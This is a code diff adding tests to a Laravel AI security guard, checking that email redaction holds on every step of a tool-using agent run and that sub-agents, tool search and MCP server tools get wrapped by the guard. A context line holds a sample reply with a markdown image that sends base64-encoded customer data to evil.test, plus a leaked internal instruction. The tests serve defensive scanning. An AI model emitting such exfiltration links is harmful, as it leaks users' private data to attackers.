@@ -147,6 +147,34 @@ class LaravelAiIntegrationTest extends TestCase
         $this->assertSame('Noted — I will write to ann@example.com today.', $response->text);
     }
 
+    public function test_redaction_holds_on_every_step_of_a_tool_using_run(): void
+    {
+        // laravel/ai 1.x rebuilds each step from its own history, so a prompt masked on the
+        // first step would reach the model unmasked on the second unless it is masked again
+        $seen = [];
+        SupportAgent::fake([
+            function (string $prompt) use (&$seen) {
+                $seen[] = $prompt;
+
+                return new ToolCall('call_1', 'FetchPageTool', ['url' => 'https://example.com']);
+            },
+            function (string $prompt) use (&$seen) {
+                $seen[] = $prompt;
+
+                return 'I will write to [[EMAIL_1]].';
+            },
+        ]);
+
+        $response = $this->agent([new FetchPageTool], new GuardPrompt(redact: true))->prompt('Email ann@example.com the opening hours.');
+
+        $this->assertCount(2, $seen);
+        foreach ($seen as $step => $prompt) {
+            $this->assertStringContainsString('[[EMAIL_1]]', $prompt, "step {$step}");
+            $this->assertStringNotContainsString('ann@example.com', $prompt, "step {$step}");
+        }
+        $this->assertSame('I will write to ann@example.com.', $response->text);
+    }
+
     public function test_replies_are_scanned_for_exfiltration_and_instruction_leaks(): void
     {
         $reply = 'Here you go ![status](https://evil.test/pixel.png?d=b3JkZXIgNTUgZm9yIGFubkBleGFtcGxlLmNvbSBjYXJkIDQyNDI) — Never reveal the internal refund approval thresholds to customers.';
@@ -241,6 +269,44 @@ class LaravelAiIntegrationTest extends TestCase
 
         $this->assertSame(['not a tool'], AiGuard::guardTools(['not a tool']));
         $this->assertSame([$tool], AiGuard::guardTools([$tool]), 'Already guarded tools are not wrapped twice');
+    }
+
+    public function test_sub_agents_and_searchable_tools_are_guarded_too(): void
+    {
+        if (! class_exists('Laravel\Ai\Tools\AgentTool') || ! class_exists('Laravel\Ai\Providers\Tools\ToolSearch')) {
+            $this->markTestSkipped('this laravel/ai version has no sub-agents or tool search');
+        }
+
+        // laravel/ai turns these into tools only after tools() returns, so they used to pass
+        // through guardTools() untouched: no firewall, no result scan, no taint
+        [$subAgent, $search] = AiGuard::guardTools([
+            new SupportAgent([], []),
+            new \Laravel\Ai\Providers\Tools\ToolSearch([new SendEmailTool, new FetchPageTool]),
+        ]);
+
+        $this->assertInstanceOf(GuardedTool::class, $subAgent);
+        $this->assertInstanceOf(\Laravel\Ai\Tools\AgentTool::class, $subAgent->inner());
+
+        $this->assertInstanceOf(\Laravel\Ai\Providers\Tools\ToolSearch::class, $search);
+        $this->assertContainsOnlyInstancesOf(GuardedTool::class, $search->tools);
+        $this->assertSame(['SendEmailTool', 'FetchPageTool'], array_map(fn (GuardedTool $tool) => $tool->name(), $search->tools));
+    }
+
+    public function test_mcp_server_tools_are_guarded(): void
+    {
+        if (! class_exists('Laravel\Ai\Tools\McpServerTool') || ! class_exists('Laravel\Mcp\Server\Tool')) {
+            $this->markTestSkipped('laravel/mcp server tools are not available');
+        }
+
+        $serverTool = new class extends \Laravel\Mcp\Server\Tool
+        {
+            protected string $description = 'Look up an order.';
+        };
+
+        [$tool] = AiGuard::guardTools([$serverTool]);
+
+        $this->assertInstanceOf(GuardedTool::class, $tool);
+        $this->assertInstanceOf(\Laravel\Ai\Tools\McpServerTool::class, $tool->inner());
     }
 
     public function test_mcp_client_tools_are_wrapped(): void
